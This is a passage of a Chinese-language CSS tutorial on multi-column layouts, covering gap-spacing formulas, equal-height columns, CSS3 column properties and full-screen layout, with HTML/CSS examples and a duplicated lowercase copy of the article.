</div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n接下来我们看怎么抵消一个空白间隔。我们假设，祖父元素宽度为A，父级元素宽度为B，父级元素设置外边距的百分比数值为x，子元素设置内边距的百分比数值为y。要注意的一点，x我们取的是绝对值，因为父级左外边距是负值，它会让A祖父宽度比B父级宽度小，从而让第一个空白区域区域抵消掉。那么这个空白区域的宽度是B - A，并且也是等于B * y；前面是长度之差的关系，长度之比就是1 + x = B / A。\n\n将这两个等式联合起来可以消掉A和B，最后可以得到x = y / (1 - y)。我们看下面这个代码，子元素设置内边距的百分比数值为5%，根据前面这个结论式子，可以算出父级元素设置外边距的百分比数值为5.263%，使用时记得加上负号。并且这个式子的关系，不会受等分数量还有祖父宽度的影响\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix { border: 1px solid red; width: 600px; overflow: hidden; }\n        .parent { display: flow-root; margin-left: -5.263%; } /*是margin-left，因为要在最左边抵消一个空白间隔*/\n        .col { float: left; box-sizing: border-box; width: 20%; padding-left: 5%; }\n        .cell1 { height: 100px; background-color: red; }\n        .cell2 { height: 100px; background-color: yellow; }\n        .cell3 { height: 100px; background-color: blue; }\n        .cell4 { height: 100px; background-color: green; }\n        .cell5 { height: 100px; background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col">\n                <div class="cell1"></div>\n            </div>\n            <div class="col">\n                <div class="cell2"></div>\n            </div>\n            <div class="col">\n                <div class="cell3"></div>\n            </div>\n            <div class="col">\n                <div class="cell4"></div>\n            </div>\n            <div class="col">\n                <div class="cell5"></div>\n            </div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n表格方式怎么解决空白间隔的问题？如果表格的边界是折叠边界模型的话，解决方式和浮动基本一样，就不再赘述了。如果表格的边界是分离边界模型的话，可以使用border-spacing来充当空白间隔，并且它有个特点就是最左边和最右边都会与表有space，这样就不用自己多添加一个空白间隔了，但是它有个缺点就是怎么用数值不能用百分比。\n\n也就是说使用border-spacing可以实现“多一个空白间隔”的情况，少一个“空白间隔”可能还是得用之前的方式，这里也不再赘述了\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            display: table;\n            border-collapse: separate; /*分离边界模型*/\n            table-layout: fixed;\n            width: 600px;\n            border-spacing: 20px 0; /*单元格与单元格之间，水平间距20px，垂直间距0*/\n            border: 1px solid red;\n        }\n        .col { display: table-cell; height: 100px }\n        .cell1 { background-color: red; }\n        .cell2 { background-color: yellow; }\n        .cell3 { background-color: blue; }\n        .cell4 { background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="col cell1"></div>\n      <div class="col cell2"></div>\n      <div class="col cell3"></div>\n      <div class="col cell4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n空白间隔问题其实有一种更好的办法规避，那就是直接使用弹性盒布局配合justify-content属性，都不需要上面这些计算过程，空白间隔大小自动分配。\n\n\n# 五、等高布局\n\n等高布局把一行分成若干列，这些列的高度都相等。它的实现一般有两种：1.表格，2.溢出配合边距。\n\n\n# 5.1 使用表格\n\n我们知道表格的高度和单元格高度是自动计算的，也就说它的高度是根据内容多少来显示的。那么同一行的高度呢？其实是默认相等的，除了跨行以外。\n\n当然，基本的设置还是要有的，表格display值，单元格display值，表格要固定宽度并且显示设置宽度。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { display: table; table-layout: fixed; width: 600px; }\n        .left { display: table-cell; background-color: red; }\n        .right { display: table-cell; background-color: yellow; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="left"></div>\n        <div class="right">CSS1：1996年12月正式推出CSS1，对字体、尺寸、颜色、文本、位置、背景、边框等进行了规范，这个阶段主要使用table和CSS1来定位表单的外观和样式。\n        CSS2：1998年5月正式推出CSS2，扩展了CSS1，添加了很多新属性和伪元素，这个阶段主要使用div和li来分割元素再搭配CSS2来定义表单界面的外观。\n        CSS2.1：2004年2月正式推出了CSS2.1，纠正了CSS2中的一些错误，也删除了一些不被浏览器所支持的属性（有些出现在CSS3规范中了）。\n        CSS3：2010年推出的全新版本CSS3，被分为若干个相互独立的模块，包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块。</div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 5.2 溢出配合边距\n\n这种方法非常巧妙，在学习使用这种方法时，最好了解一下边距对盒子的影响，还需要了解overflow: hidden的触发临界点。\n\n具体是让父级元素设置overflow: hidden，子级浮动并且设置padding-bottom: 9999px;和margin-bottom: -9999px;这种特殊的处理方式。这种特殊的处理方式有几种叫法：内外补丁负值法、内边距补偿法。\n\n分析：\n\n * 我们期望的效果是父容器的高度是随着最高列的内容高度来自动调整的。其他几列内容高度肯定是不如最高列的，那就需要使用内边距补偿短缺的高度。因为内边距算作展示效果里的，所有这个方法的等高布局是一种伪登高布局。\n * 但是我们并不清楚实际场景中哪一列会是最高列，所以给所有列都设置了padding，除最高列的其他列要补偿的高度并不相同，那可以先让padding都取一个超大值，再使用overflow: hidden将多余的展示尺寸都截取掉，这样就可以形成一个视觉上等高的几列。\n * 我们知道这个父容器的高度并没有显示设置，它是依赖于子元素的布局尺寸撑起来的，而之前又使用了padding，它既增大了布局尺寸也增大了展示尺寸，那么父容器的边界此时肯定是一直包裹这子元素的边界的，也就是说overflow: hidden并不会生效。\n * 刚好margin取负值可以减少布局尺寸但又不影响展示尺寸，这样就可以让overflow: hidden生效了。还有就是，期望让父容器的高度是随着最高列的内容高度来自动调整，那就让padding和margin的绝对值相等，最后剩下的布局尺寸就是最高列的内容高度了。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { overflow: hidden; width: 600px;}\n        .col { float: left; padding-bottom: 9999px; margin-bottom: -9999px; }\n        .left { width: 50%; background-color: red; }\n        .right { width: 50%; background-color: yellow; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col left">CSS</div>\n        <div class="col right">CSS1：1996年12月正式推出CSS1，对字体、尺寸、颜色、文本、位置、背景、边框等进行了规范，这个阶段主要使用table和CSS1来定位表单的外观和样式。\n        CSS2：1998年5月正式推出CSS2，扩展了CSS1，添加了很多新属性和伪元素，这个阶段主要使用div和li来分割元素再搭配CSS2来定义表单界面的外观。</div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n其实每列的实际高度就是每列的contentArea高度，视觉上的等高是每列contentArea高度加上“还留在父元素框内的padding高度”，多余的padding都被overflow: hidden截掉了。\n\n\n# 六、css3中的多列布局\n\n\n# 6.1 列数和最小宽度\n\ncss3中通过column-count属性来对一个元素的内容进行多列布局，该属性的值可以是auto表示由css自动分配，也可以是一个整数表示有几列。\n\n还有一个属性是column-width，表示列的宽度或者列的最小宽度，也可以设置auto也可以设置一个数值。\n\n其实这两个属性可以简写在一起，比如column-count: 4; column-width: 100px;其实是可以简写成columns: 4 100px;，千万要注意是columns而不是column。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { border: 1px solid red; width: 600px; column-count: 4; column-width: 100px; }\n        .col1 { height: 100px; background-color: red; }\n        .col2 { height: 100px; background-color: yellow; }\n        .col3 { height: 100px; background-color: blue; }\n        .col4 { height: 100px; background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n        <div class="col4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 6.2 空白间隔、间隔边框\n\ncolumn-gap这个属性可以更改列与列之间的空白间隔，默认值是normal对应的是1em的长度，可以设置具体数值（正整数）。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { border: 1px solid red; width: 600px; columns: 4 100px; column-gap:20px; }\n        .col1 { height: 100px; background-color: red; }\n        .col2 { height: 100px; background-color: yellow; }\n        .col3 { height: 100px; background-color: blue; }\n        .col4 { height: 100px; background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n        <div class="col4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\ncolumn-rule这个属性是用来设置列与列之间的边框的，它有三个方面：边框宽度、边框颜色和边框样式。可以分开写：column-rule-width、column-rule-color和column-rule-style。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            width: 600px; border: 1px solid red; columns: 4 100px;\n            column-gap:20px; column-rule: 2px solid green;\n        }\n        .col1 { height: 100px; background-color: red; }\n        .col2 { height: 100px; background-color: yellow; }\n        .col3 { height: 100px; background-color: blue; }\n        .col4 { height: 100px; background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n        <div class="col4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n可以看到空白间隔的宽度是包含里column-rule的宽度，也就是说column-rule的宽度不会自己再占空间。\n\n\n# 6.3 横跨所有列\n\ncolumn-span这个属性是为某列设置是否横跨所有列，默认值是none表示不跨列，all表示跨所有列。\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            width: 600px; border: 1px solid red; columns: 4 100px;\n            column-gap:20px; column-rule: 2px solid green;\n        }\n        .col1 { height: 100px; background-color: red; }\n        .col2 { height: 100px; background-color: yellow; }\n        .col3 { height: 100px; background-color: blue; }\n        .col4 { height: 100px; background-color: green; }\n        .col5 { height: 100px; background-color: skyblue; column-span: all; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n        <div class="col1"></div>\n        <div class="col2"></div>\n        <div class="col3"></div>\n        <div class="col4"></div>\n        <div class="col5"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 七、全屏布局\n\n全屏布局指的是html铺满整个浏览器页面，没有水平和垂直的滚动条，让html跟着页面大小变化而变化。\n\n\n\n跟圣杯布局差不多。\n\n<html>\n<head>\n    <style type="text/css">\n        body, html { margin: 0; }\n        .header {\n            position: fixed; width: 100%; height: 100px;\n            top: 0; left: 0; right: 0; background-color: skyblue;\n        }\n        .footer {\n            position: fixed; width: 100%; height: 100px;\n            bottom: 0; left: 0; right: 0; background-color: lightblue;\n        }\n        .content {\n            position: fixed; width: 100%; top: 100px;\n            bottom: 100px; left: 0; right: 0; background-color: red;\n        }\n        .left {\n            float: left; width: 400px; height: 100%;\n            overflow: auto; background-color: yellow;\n        }\n        /*.right {\n            float: left; width: calc(100% - 400px); height: 100%;\n            overflow: auto; background-color: green;\n        }*/\n        .right {\n            height: 100%; margin-left: 400px;\n            overflow: auto; background-color: green;\n        }\n    </style>\n</head>\n<body>\n    <div class="header"></div>\n    <div class="content">\n        <div class="left"></div>\n        <div class="right"></div>\n    </div>\n    <div class="footer"></div>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n',normalizedContent:'# 多列布局\n\n\n# 一、什么是多列布局\n\n多列布局会把内容按列排序的方式进行布局，就像文本在报纸上的排列那样。\n\n多列布局的分类，大概分为两列布局、三列布局和等分等高布局。像两列布局和三列布局，列可采用定宽或者自适应，两列布局还好情况不复杂（左列定宽右列自适应），但是三列情况就多一些了。\n\n三列布局中，如果左边两个是定宽右边那个是自适应，这个情况跟两列布局类似；如果左右两边是定宽而中间那个是自适应，这就有些复杂了，还会衍生出圣杯布局和双飞翼布局。\n\n\n# 二、两列布局\n\n\n\n两列布局一般情况是左列定宽右列自适应，它的实现方式有三种：\n\n * float + calc()\n * float + bfc\n * 使用table表格\n\n\n# 2.1 float + calc()\n\n其实float + calc()这种实现方式的前身是float + margin，因为calc()这个方法是css3推出的，在css3之前是使用边距和auto宽度来控制自适应列的展示的。\n\n左列设置左浮动，这样后面的元素与左列会在同一行（浮动效果）从而形成两列；左列设置固定宽度，右列自适应并且不能被左列遮挡，需要设置左边距，宽度其实不用设置（宽度加上左边距等于一行，块级元素特性）。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        .right { margin-left: 300px; background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    \x3c!--左列，左浮动，固定宽度--\x3e\n    <div class="left"></div>\n    \x3c!--右列，自适应宽度，设置好左边距--\x3e\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n如果右列的某个后代元素使用了清除浮动，这个后代元素会单独去新的一行里显示，这就破坏了两列布局。为什么会去新的一行里显示，可以回顾一下清除浮动这一章节。另外一个问题是，一个浮动另一个不浮动，层级上有问题，并且这两个之间可能会留出空隙来（老版浏览器）。\n\n为了解决上面的问题，可以直接让右列也浮动起来，右列宽度直接使用css3里的calc()来计算，右列宽度 = 100% - 左列宽度。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        .right { float: right; width: calc(100% - 300px); background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    \x3c!--左列，左浮动，固定宽度--\x3e\n    <div class="left"></div>\n    \x3c!--右列，右浮动（左浮动也可以），calc()来自适应--\x3e\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 2.2 float + bfc\n\n其实就是bfc的作用之一，bfc不会被浮动区域覆盖。float + bfc这个方案优点就是简单，但是留下的问题就是一个不浮动另一个不浮动，不过问题不大。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        /*display: flow-root会创建无副作用的bfc*/\n        .right { display: flow-root; background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2.3 使用table表格\n\n对非<table>元素使用表格布局，来达到两列布局的效果。需要注意的点就是，采用100%宽度的固定宽度布局，再加上两个div，其中一个div是固定宽度，另一个不设置宽度，它会由总表宽减去已有宽度（左列的固定宽度）得到。这种两列布局，兼容性不错，就是得熟悉表格布局（边界模式和宽度计算方式）。\n\n<html>\n<head>\n    <style type="text/css">\n        /*表格布局，固定宽度，宽度设置页面的100%*/\n        .parent { display: table; table-layout: fixed; width: 100%; }\n        .left, .right { height: 200px; }\n        .left { display: table-cell; width: 300px; background-color: red; }\n        .right { display: table-cell; background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="left"></div>\n      <div class="right"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 三、三列布局\n\n\n\n三列布局有一种情况是，左边两个是定宽右边那个是自适应，它的实现方式与两列布局基本一致，所以不再这一节里赘述了。\n\n三列布局另一种情况是，左右两边是定宽而中间那个是自适应。\n\n\n# 3.1 经典的圣杯布局\n\n圣杯布局是头部、中间内容和底部构成，而这个最重要的中间内容就是一个三列布局，并且是左右两边是定宽而中间那个是自适应的情况。\n\n\n\n在css3之前常使用float + margin来实现，你可能会写成这个样子：\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right, .center { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        .center { margin-left: 300px; margin-right: 300px; background-color: #cccccc; }\n        .right { float: right; width: 300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="center"></div>\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n对应效果图：\n\n\n什么原因呢？可以想一下right这个div在没有浮动前处于什么位置？是不是在center这个div的下边界那里（块级元素特性）？再根据浮动规则的其中一条“浮动元素的顶边不能比它原本未浮动前所在框体顶边还高”，现在你明白了怎么回事吧！\n\n有一个解决办法就是把right这个div和center这个div的代码位置交换一下，但是代码阅读体验不好，并且还可能会影响搜索引擎对网页的收录。还有个解决办法就是把center这个div放到最前面，左右两个浮动div再使用相对定位。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right, .center { height: 200px; }\n        .center { margin-left: 300px; margin-right: 300px; background-color: #cccccc; }\n        .left { float: left; position: relative; bottom: 200px;  width: 300px; background-color: red; }\n        .right { float: right; position: relative; bottom: 200px; width: 300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="center"></div>\n    <div class="left"></div>\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n其实可以使用经典的解决方案，center这个div还是放到最前面，在让这三个div都浮动，利用“margin为负值”将左右两个div提上来。因为让center这个div也浮动了（块级元素变为浮动元素），那么它的自适应宽度失效了（没法使用某一边的外边距了），那么就需要添加一个父级div（父级的边界或者内边距可以约束子级浮动元素）。\n\n<html>\n<head>\n    <style type="text/css">\n        /* 设置父级bfc的原因是需要包含子级浮动的高度 */\n        .parent { display: flow-root; padding-left: 300px; padding-right: 300px }\n        .left, .right, .center { height: 200px; }\n        .center { float: left; width:100%; background-color: #cccccc; }\n        .left {  width: 300px; float: left; margin-left: -300px; position: relative; right: 100%; background-color: red; }\n        /*比较有趣的一点，.right设置float: left或float: right，效果一样*/\n        .right { width: 300px; float: left; margin-right: -300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\x3c!--子元素都浮动，那就需要这个父级元素，最好设置成bfc--\x3e\n        <div class="center"></div>\n        <div class="left"></div>\n        <div class="right"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n这个解决方案的重点就在于margin-left: -300px或者margin-right: -300px这种负值外边距的使用，它对浮动的影响可以查看之前的边距对浮动的影响。\n\n还有要注意的一点，并没有使用margin-left: 100%，因为考虑到center区域比left区域宽度小的话，left这个浮动元素就回不到上一行了；并且它并不需要min-width的限制。最后要注意的一点就是，左右两列回到上一行后，左列还在center区域的右边界，需要使用相对定位将它定位到左边空处。\n\n\n# 3.2 双飞翼布局\n\n双飞翼布局是对经典圣杯布局的一种优化，最主要的优化就是去掉了相对定位，并且将父级元素的contentarea宽度设置为100%（肯定比左右两列之和要大），这样就能避免类似于margin-left: 100%的问题（上一节说过），所以双飞翼可以直接使用margin-left: 100%来对左列设置位置。\n\n<html>\n<head>\n    <style type="text/css">\n        /* 设置父级bfc的原因是需要包含子级浮动的高度 */\n        .parent { display: flow-root; }\n        .left, .right, .center, .inner { height: 200px; }\n        .center { float: left; width:100%; background-color: #cccccc; }\n        .inner { margin-left: 300px; margin-right: 300px; background-color: green; }\n        .left {  width: 300px; float: left; margin-left: -100%; background-color: red; }\n        /*比较有趣的一点，.right设置float: left或float: right，效果一样*/\n        .right { width: 300px; float: left; margin-left: -300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="parent">\x3c!--子元素都浮动，那就需要这个父级元素，最好设置成bfc--\x3e\n        <div class="center">\n            <div class="inner"></div>\n        </div>\n        <div class="left"></div>\n        <div class="right"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n不过双飞翼有个问题，当浏览器缩小的比左右两列之和还小时，右列会覆盖左列（可以加上min-width限制）。\n\n\n# 3.3 圣杯的其他实现\n\n我们使用**float + calc()**来实现看看：\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right, .center { height: 200px; float: left; }\n        .left { width: 300px; background-color: red; }\n        .center { width: calc(100% - 600px); background-color: #cccccc; }\n        .right { width: 300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="center"></div>\n    <div class="right"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n如果使用float + bfc呢？其实跟float + margin类似，问题也一样，需要交换right这个div和center这个div的代码位置。\n\n<html>\n<head>\n    <style type="text/css">\n        .left, .right, .center { height: 200px; }\n        .left { float: left; width: 300px; background-color: red; }\n        .center { display: flow-root; background-color: #cccccc; }\n        .right { float: right; width: 300px; background-color: blue; }\n    </style>\n</head>\n<body>\n    <div class="left"></div>\n    <div class="right"></div>\n    <div class="center"></div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n前两种都有双飞翼布局类似的问题，当浏览器缩小的比左右两列之和还小时，右列会跑到新行去（可以加上min-width限制）。\n\n使用table表格的话，跟两列布局没什么区别，也不会出现什么问题。\n\n<html>\n<head>\n    <style type="text/css">\n        /*表格布局，固定宽度，宽度设置页面的100%*/\n        .parent { display: table; table-layout: fixed; width: 100%; }\n        .left, .right, .center { height: 200px; }\n        .left { display: table-cell; width: 300px; background-color: red; }\n        .right { display: table-cell; width: 300px; background-color: blue; }\n        .center { background-color: #cccccc; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="left"></div>\n      <div class="center"></div>\n      <div class="right"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 四、等分布局\n\n等分布局把一行分成若干列，这些列的宽度都相等。它的实现一般有两种：浮动和表格。\n\n\n# 4.1 使用浮动或表格\n\n4个都向左浮动，分配的宽度为25%\n\n<html>\n<head>\n    <style type="text/css">\n        .parent { display: flow-root; }\n        .col { float: left; width: 25%; height: 200px; }\n        .cell1 { background-color: red; }\n        .cell2 { background-color: yellow; }\n        .cell3 { background-color: blue; }\n        .cell4 { background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="col cell1"></div>\n      <div class="col cell2"></div>\n      <div class="col cell3"></div>\n      <div class="col cell4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n表格的话，设置父元素为display: table，4个子元素为display: table-cell，表要记得设置宽度。\n\n<html>\n<head>\n    <style type="text/css">\n        /*表格布局，固定宽度，宽度设置页面的100%*/\n        .parent { display: table; table-layout: fixed; width: 100%; }\n        .col { display: table-cell; height: 200px }\n        .cell1 { background-color: red; }\n        .cell2 { background-color: yellow; }\n        .cell3 { background-color: blue; }\n        .cell4 { background-color: green; }\n    </style>\n</head>\n<body>\n    <div class="parent">\n      <div class="col cell1"></div>\n      <div class="col cell2"></div>\n      <div class="col cell3"></div>\n      <div class="col cell4"></div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 4.2 空白间隔问题\n\n\n\n可能会遇到间隔问题，如上图。而空白间隔应该要比展示列多一个或者少一个，表格方式的倒还好（分离边界模型），主要是浮动方式修改起来有些麻烦。浮动方式修改，比较笨的解决办法是，使用空白div块来作为空白间隔；另外一种，让边距充当空白间隔，然后对多出或者缺少的空白间隔进行特殊处理。\n\n\n\n\n边距充当空白间隔的问题和解决方案：\n\n 1. 如果对子级元素使用外边距充当空白间隔，按百分比分配宽度时就需要考虑外边距了。外边距没考虑好，浮动元素可能会跳到下一行去了。其实可以使用box-sizing: border-box将子级元素改为ie盒模型，内边距被包含在宽度中了，让内边距作为空白间隔，这就不会影响宽度分配了。\n 2. 但是空白间隔的多出或者缺少没有解决。子级元素的宽度分配是依赖于父级元素的，如果让父级元素设置内边距，或许可以增加一个空白间隔，但是无法抵消一个空白间隔（内边距不能为负数）。再者，我们希望空白间隔也是用百分比，子级元素倒好说，但是父级设置边距用百分比是没有参考对象。那么，综合这两个问题，可以引入一个祖父元素，对父级元素设置外边距使用百分比，这就可以增加或抵消一个空白间隔了。\n 3. 最后一个问题是，父级元素设置外边距的百分比数值，与子元素设置内边距的百分比数值，这两者之间有没有联系？答案是有的，下面我们来分析一下。\n\n\n\n我们假设，祖父元素宽度为a，父级元素宽度为b，父级元素设置外边距的百分比数值为x，子元素设置内边距的百分比数值为y。它们有什么联系呢？联系就在于在最后一个空白区域，这个空白区域的宽度等于b * y，也等于a - b这个差值，这个差值其实就是父级元素设置外边距来额外添加的一个空白间隔，因为父级元素设置了这一个外边距，那么1 - x = b / a。\n\n将这两个等式联合起来可以消掉a和b，最后可以得到x = y / (y + 1)。我们看下面这个代码，子元素设置内边距的百分比数值为5%，根据前面这个结论式子，可以算出父级元素设置外边距的百分比数值为4.762%。并且这个式子的关系，不会受等分数量还有祖父宽度的影响\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix { border: 1px solid red; width: 600px; }\n        .parent { display: flow-root; margin-right: 4.762%; } /*是margin-right，因为要在最右边添加一个空白间隔*/\n        .col { float: left; box-sizing: border-box; width: 20%; padding-left: 5%; }\n        .cell1 { height: 100px; background-color: red; }\n        .cell2 { height: 100px; background-color: yellow; }\n        .cell3 { height: 100px; background-color: blue; }\n        .cell4 { height: 100px; background-color: green; }\n        .cell5 { height: 100px; background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col">\n                <div class="cell1"></div>\n            </div>\n            <div class="col">\n                <div class="cell2"></div>\n            </div>\n            <div class="col">\n                <div class="cell3"></div>\n            </div>\n            <div class="col">\n                <div class="cell4"></div>\n            </div>\n            <div class="col">\n                <div class="cell5"></div>\n            </div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n接下来我们看怎么抵消一个空白间隔。我们假设，祖父元素宽度为a，父级元素宽度为b，父级元素设置外边距的百分比数值为x，子元素设置内边距的百分比数值为y。要注意的一点，x我们取的是绝对值，因为父级左外边距是负值，它会让a祖父宽度比b父级宽度小，从而让第一个空白区域区域抵消掉。那么这个空白区域的宽度是b - a，并且也是等于b * y；前面是长度之差的关系，长度之比就是1 + x = b / a。\n\n将这两个等式联合起来可以消掉a和b，最后可以得到x = y / (1 - y)。我们看下面这个代码，子元素设置内边距的百分比数值为5%，根据前面这个结论式子，可以算出父级元素设置外边距的百分比数值为5.263%，使用时记得加上负号。并且这个式子的关系，不会受等分数量还有祖父宽度的影响\n\n<html>\n<head>\n    <style type="text/css">\n        .parent-fix { border: 1px solid red; width: 600px; overflow: hidden; }\n        .parent { display: flow-root; margin-left: -5.263%; } /*是margin-left，因为要在最左边抵消一个空白间隔*/\n        .col { float: left; box-sizing: border-box; width: 20%; padding-left: 5%; }\n        .cell1 { height: 100px; background-color: red; }\n        .cell2 { height: 100px; background-color: yellow; }\n        .cell3 { height: 100px; background-color: blue; }\n        .cell4 { height: 100px; background-color: green; }\n        .cell5 { height: 100px; background-color: skyblue; }\n    </style>\n</head>\n<body>\n    <div class="parent-fix">\n        <div class="parent">\n            <div class="col">\n                <div class="cell1"></div>\n            </div>\n            <div class="col">\n                <div class="cell2"></div>\n            </div>\n            <div class="col">\n                <div class="cell3"></div>\n            </div>\n            <div class="col">\n                <div class="cell4"></div>\n            </div>\n            <div class="col">\n                <div class="cell5"></div>\n            </div>\n        </div>\n    </div>\n</body>\n<html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n表格方式怎么解决空白间隔的问题？如果表格的边界是折叠边界模型的话，解决方式和浮动基本一样，就不再赘述了。如果表格的边界是分离边界模型的话，可以使用border-spacing来充当空白间隔，并且它有个特点就是最左边和最右边都会与表有space，这样就不用自己多添加一个空白间隔了，但是它有个缺点就是怎么用数值不能用百分比。\n\n也就是说使用border-spacing可以实现“多一个空白间隔”的情况，少一个“空白间隔”可能还是得用之前的方式，这里也不再赘述了\n\n<html>\n<head>\n    <style type="text/css">\n        .parent {\n            display: table;\n            border-collapse: separate; /*分离边界模型*/\n            table-layout: fixed;\n            width: 600px;\n            border-spacing: 20px 0; 